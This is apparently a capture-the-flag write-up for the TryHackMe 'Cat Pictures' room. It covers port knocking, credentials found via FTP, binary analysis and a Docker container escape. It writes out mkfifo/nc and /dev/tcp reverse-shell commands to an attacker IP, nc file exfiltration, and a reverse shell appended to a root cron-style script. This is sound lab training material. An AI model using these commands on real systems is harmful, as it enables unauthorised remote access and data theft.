# Cat Pictures

**Date:** 08, June, 2021

**Author:** Dhilip Sanjay S

---

[Click Here](https://tryhackme.com/room/catpictures) to go to the TryHackMe room.

## Enumeration

### Nmap

```bash
$ nmap -sC -sV -p- -oN nmap.out 10.10.96.70
Nmap scan report for 10.10.96.70
Host is up (0.16s latency).
Not shown: 65530 closed ports
PORT     STATE    SERVICE      VERSION
21/tcp   filtered ftp
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a (RSA)
|   256 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 (ECDSA)
|_  256 ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 (ED25519)
2375/tcp filtered docker
4420/tcp open     nvm-express?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp filtered http-proxy
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4420-TCP:V=7.91%I=7%D=6/8%Time=60BF02E4%P=x86_64-pc-linux-gnu%r(NUL
SF:L,A0,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x
SF:20do\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are
SF:\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\n
SF:Please\x20enter\x20password:\n")%r(GenericLines,C6,"INTERNAL\x20SHELL\x
SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(GetRequest,C
SF:6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20d
SF:o\x20not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x2
SF:0fixing\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPle
SF:ase\x20enter\x20password:\nInvalid\x20password\.\.\.\nConnection\x20Clo
SF:sed\n")%r(HTTPOptions,C6,"INTERNAL\x20SHELL\x20SERVICE\nplease\x20note:
SF:\x20cd\x20commands\x20do\x20not\x20work\x20at\x20the\x20moment,\x20the\
SF:x20developers\x20are\x20fixing\x20it\x20at\x20the\x20moment\.\ndo\x20no
SF:t\x20use\x20ctrl-c\nPlease\x20enter\x20password:\nInvalid\x20password\.
SF:\.\.\nConnection\x20Closed\n")%r(RTSPRequest,C6,"INTERNAL\x20SHELL\x20S
SF:ERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at\x2
SF:0the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x20th
SF:e\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20password:
SF:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n")%r(RPCCheck,A0,"IN
SF:TERNAL\x20SHELL\x20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20
SF:not\x20work\x20at\x20the\x20moment,\x20the\x20developers\x20are\x20fixi
SF:ng\x20it\x20at\x20the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x
SF:20enter\x20password:\n")%r(DNSVersionBindReqTCP,C6,"INTERNAL\x20SHELL\x
SF:20SERVICE\nplease\x20note:\x20cd\x20commands\x20do\x20not\x20work\x20at
SF:\x20the\x20moment,\x20the\x20developers\x20are\x20fixing\x20it\x20at\x2
SF:0the\x20moment\.\ndo\x20not\x20use\x20ctrl-c\nPlease\x20enter\x20passwo
SF:rd:\nInvalid\x20password\.\.\.\nConnection\x20Closed\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Port 8080

![Cat Pictures Home](Images/cat-pictures-home.png)

- Identify the version by visiting: 
    - `http://10.10.151.249:8080/docs/CHANGELOG.html`
    - `http://10.10.151.249:8080/styles/prosilver/style.cfg`

- We can see that the version of phpBB is 3.3.3
- Searching for exploits using `searchsploit`, there were no results found for that version:

```bash
$ searchsploit phpBB 3.3.3
Exploits: No Results
Shellcodes: No Results
```


### Other ports
- FTP 21 is filtered
- SSH 22 was accepting login using private keys!
- Port 4420 was an internal shell, which also required a password
- Port 2375 - may be a docker container is there!


---

## Port Knocking

- At this point, I didn't know how to proceed further. So, I just went and read a write up.
- I learnt a new thing called **port knocking**.

{% hint style="info" %}
- In computer networking, **port knocking** is a method of externally opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. 
- Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s). 
- A variant called single packet authorization (SPA) exists, where only a single "knock" is needed, consisting of an encrypted packet.
{% endhint %}

- The post in the website, gives the hint about port knocking and the sequence of ports to be knocked:

![Knock Knock](Images/cat-pictures-knock.png)


- Before port knocking, nmap showing `ftp` being filtered:

```bash
$ nmap -p21,22,2375,4420,8080 10.10.151.249
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 12:17 IST
Nmap scan report for 10.10.151.249
Host is up (0.21s latency).

PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   open     ssh
2375/tcp filtered docker
4420/tcp open     nvm-express
8080/tcp open     http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

- Port knocking the correct sequence using `nc`:
    - `v` - verbose
    - `z` - zero mode (used for scanning)
- One can also use `knock` or `nmap -Pn` to do the same.

```bash
$ for p in 1111 2222 3333 4444; do nc -vz 10.10.151.249 $p; done;
10.10.151.249: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.151.249] 1111 (?) : Connection refused
10.10.151.249: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.151.249] 2222 (?) : Connection refused
10.10.151.249: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.151.249] 3333 (?) : Connection refused
10.10.151.249: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.151.249] 4444 (?) : Connection refused
```

- After port knocking, nmap showing `ftp` as opened:

```bash
$ nmap -p21,22,2375,4420,8080 10.10.151.249
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 12:17 IST
Nmap scan report for 10.10.151.249
Host is up (0.21s latency).

PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
2375/tcp filtered docker
4420/tcp open     nvm-express
8080/tcp open     http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
```

---

## Accessing FTP

- Now that the FTP is open, we can access it.
- We could find a file named `note.txt`:

```bash
$ ftp 10.10.151.249
Connected to 10.10.151.249.
220 (vsFTPd 3.0.3)
Name (10.10.151.249:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           162 Apr 02 14:32 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (162 bytes).
226 Transfer complete.
162 bytes received in 0.00 secs (742.7377 kB/s)
ftp> exit
221 Goodbye.
```

- The contents of the `note.txt` gave the password for the **internal shell** in port 4420:

```bash
$ cat note.txt 
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

---

## Internal Shell

- Login into the internal shell using the password found:

```bash
$ nc  10.10.151.249 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted
```

- But we don't have most of the commands.
- Only the following binaries were available:

```bash
ls -la /bin
total 1520
drwxrwxr-x  2 1001 1001    4096 Apr  2 23:05 .
drwxr-xr-x 10 1001 1001    4096 Jun  8 07:28 ..
-rwxr-xr-x  1 1001 1001 1113504 Apr  1 20:32 bash
-rwxr-xr-x  1    0    0   35064 Apr  1 20:32 cat
-rwxr-xr-x  1    0    0   35000 Apr  1 20:32 echo
-rwxr-xr-x  1    0    0  133792 Apr  1 20:32 ls
-rwxr-xr-x  1    0    0   35312 Apr  2 23:05 nc
-rwxr-xr-x  1    0    0   63704 Apr  1 20:32 rm
-rwxr-xr-x  1    0    0  121432 Apr  1 20:37 sh

ls -la /usr/bin
total 648
drwxr-xr-x 2 0 0   4096 Apr  3 01:31 .
drwxr-xr-x 4 0 0   4096 Apr  2 22:43 ..
-rwxr-xr-x 1 0 0  63672 Apr  3 01:20 mkfifo
-rwxr-xr-x 1 0 0  88280 Apr  3 01:31 touch
-rwxr-xr-x 1 0 0 499264 Apr  2 22:43 wget
```

- At this point, I tried to execute `/bin/bash`. But I could get a proper shell.
- Again reading some writeup, I found that `mkfifo` can be used to gain a reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.7.91 1234 >/tmp/f
```

- Check out **Pentester Monkey's Reverse Shell cheatsheet**.

---

## Internal shell to Reverse shell

- Now by using `nc`, we can get a proper reverse shell:
- On the victim machine:

```bash
$ nc 10.10.151.249 4420
INTERNAL SHELL SERVICE
please note: cd commands do not work at the moment, the developers are fixing it at the moment.
do not use ctrl-c
Please enter password:
sardinethecat
Password accepted

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.7.91 1234 >/tmp/f
```

- On the attacker machine:

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.151.249] 34920
/bin/sh: 0: can't access tty; job control turned off
# ls
bin
etc
home
lib
lib64
opt
shell
tmp
usr
```

- Now, we can use `cd` command to look for interesting files.
- There was an binary named `runme`, but which required a different password:

```bash
# cd /home/catlover 
# ls
runme
# ./runme
Please enter yout password: sardinethecat
Access Denied
```

---

## Analyzing runme

- To analyze the binary, we need `strings` (This was not available in the victim machine)
- Transfering the `runme` binary to attacker machine using `nc` and run `strings`:

- On the victim machine:

```bash
# nc 10.17.7.91 1234 < runme
```

- On the attacker machine:

```
$ nc -lvnp 1234 > runme
listening on [any] 1234 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.151.249] 34922
^C

$ file runme
runme: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d5d24f8a79f2afcadac716e2a6f6cdad3f38d9fe, for GNU/Linux 3.2.0, not stripped

$ strings runme 
[..snip..]
rebecca
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
[..snip..]
```

- As you can see, `rebecca` must be the password.
- Once we run the binary, we get the **private ssh key**: 

```bash
# ./runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 

# ls
id_rsa
runme

# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
[..snip..]
-----END RSA PRIVATE KEY-----
```

---

## Inside Docker container

- Login using the private ssh key.
    - **Note:** Modify the permission of `id_rsa` to `600`

```bash
$ nano id_rsa
$ chmod 600 id_rsa 

$ ssh -i id_rsa catlover@10.10.151.249
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


52 updates can be applied immediately.
25 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Jun  4 14:40:35 2021
root@7546fa2336d6:/root# ls
flag.txt
root@7546fa2336d6:/root# cat flag.txt 
<REDACTED>
```

- We could find the `flag.txt` here.
- But it says we are `root` user. Probably we are inside the docker container.

### Running Linpeas

- Transfer Linpeas to the victim machine using `curl`:

```bash
root@7546fa2336d6:/root# curl http://10.17.7.91:8000/linpeas.sh > linpeas.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  318k  100  318k    0     0   277k      0  0:00:01  0:00:01 --:--:--  277k
```

- On running linpeas, we get the clue `/opt/clean`:

```bash
root@7546fa2336d6:/root# chmod +x linpeas.sh
root@7546fa2336d6:/root# ./linpeas.sh > linpeas.out

[..snip..]
[+] System stats
Filesystem      Size  Used Avail Use% Mounted on                                                                                                 
overlay          20G  7.3G   12G  40% /
tmpfs            64M     0   64M   0% /dev
tmpfs           240M     0  240M   0% /sys/fs/cgroup
shm              64M     0   64M   0% /dev/shm
/dev/xvda1       20G  7.3G   12G  40% /opt/clean
tmpfs           240M     0  240M   0% /proc/acpi
tmpfs           240M     0  240M   0% /proc/scsi
tmpfs           240M     0  240M   0% /sys/firmware
              total        used        free      shared  buff/cache   available
Mem:         490660      344948       17924       31480      127788      102468
Swap:             0           0           0
[..snip..]
```

- Check out the files over there!
- We have a file named `clean.sh`.

```bash
root@7546fa2336d6:/# cd /opt/clean
root@7546fa2336d6:/opt/clean# ls
clean.sh

root@7546fa2336d6:/opt/clean# cat clean.sh 
#!/bin/bash

rm -rf /tmp/*
```

---

## Root flag

- We can modify the clean.sh and include a reverse shell:

```bash
root@7546fa2336d6:/opt/clean# echo "bash -i >& /dev/tcp/10.17.7.91/1234 0>&1" >> clean.sh
root@7546fa2336d6:/opt/clean# cat clean.sh 
#!/bin/bash

rm -rf /tmp/*
bash -i >& /dev/tcp/10.17.7.91/1234 0>&1
```


- On attacker machine, we can get the reverse shell as well as the root flag:

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.7.91] from (UNKNOWN) [10.10.151.249] 35062
bash: cannot set terminal process group (12666): Inappropriate ioctl for device
bash: no job control in this shell
root@cat-pictures:~# ls
ls
firewall
root.txt

root@cat-pictures:~# cat root.txt
cat root.txt
Congrats!!!
Here is your flag:

<REDACTED>
```

---

## Port Knock - Additional Info

- I was curious, to know how to setup port knock.
- So, I checked out the contents of firewall folder and the firewall rules.

```bash
root@cat-pictures:~/firewall# cat rules.fw
cat rules.fw
# Generated by iptables-save v1.6.1 on Fri Apr  2 17:37:14 2021
*nat
:PREROUTING ACCEPT [9:540]
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:POSTROUTING ACCEPT [9:540]
:DOCKER - [0:0]
-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER
-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
-A POSTROUTING -s 172.18.0.0/16 ! -o br-98674f8f20f9 -j MASQUERADE
-A POSTROUTING -s 172.18.0.3/32 -d 172.18.0.3/32 -p tcp -m tcp --dport 8443 -j MASQUERADE
-A POSTROUTING -s 172.18.0.3/32 -d 172.18.0.3/32 -p tcp -m tcp --dport 8080 -j MASQUERADE
-A DOCKER -i docker0 -j RETURN
-A DOCKER -i br-98674f8f20f9 -j RETURN
-A DOCKER ! -i br-98674f8f20f9 -p tcp -m tcp --dport 8080 -j DNAT --to-destination 172.18.0.3:8080
COMMIT
# Completed on Fri Apr  2 17:37:14 2021
# Generated by iptables-save v1.6.1 on Fri Apr  2 17:37:14 2021
*filter
:INPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [219:19820]
:DOCKER - [0:0]
:DOCKER-ISOLATION-STAGE-1 - [0:0]
:DOCKER-ISOLATION-STAGE-2 - [0:0]
:DOCKER-USER - [0:0]
-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A INPUT -p tcp -m tcp --dport 2375 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -p tcp -m tcp --dport 21 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -p tcp -m tcp --dport 8080 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -p tcp -m tcp --dport 21 -j REJECT --reject-with icmp-port-unreachable
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A FORWARD -o br-98674f8f20f9 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o br-98674f8f20f9 -j DOCKER
-A FORWARD -i br-98674f8f20f9 ! -o br-98674f8f20f9 -j ACCEPT
-A FORWARD -i br-98674f8f20f9 -o br-98674f8f20f9 -j ACCEPT
-A DOCKER -d 172.18.0.3/32 ! -i br-98674f8f20f9 -o br-98674f8f20f9 -p tcp -m tcp --dport 8080 -j ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -i br-98674f8f20f9 ! -o br-98674f8f20f9 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -o br-98674f8f20f9 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN
COMMIT
# Completed on Fri Apr  2 17:37:14 2021
```


- But it didn't mention anything about port knocking.
- With a little bit of googling, I found that the port knocking configuration file is `/etc/knock.conf`

```bash
root@cat-pictures:~/firewall# cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
        UseSyslog

#[openDocker]
#       sequence    = 1278,6675,8102,7461
#       seq_timeout = 15
#       command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 2375 -j ACCEPT && iptables -D INPUT -p tcp --dport 2375 -j REJECT
#       tcpflags    = syn


[openFTP]
        sequence    = 1111,2222,3333,4444
        seq_timeout = 15
        command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 21 -j ACCEPT && iptables -D INPUT -p tcp --dport 21 -j REJECT
        tcpflags    = syn
```

---

## References

- [How to secure ssh server using port knocking](https://www.rapid7.com/blog/post/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/)
- [Pentest Monkey - Reverse Shell Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)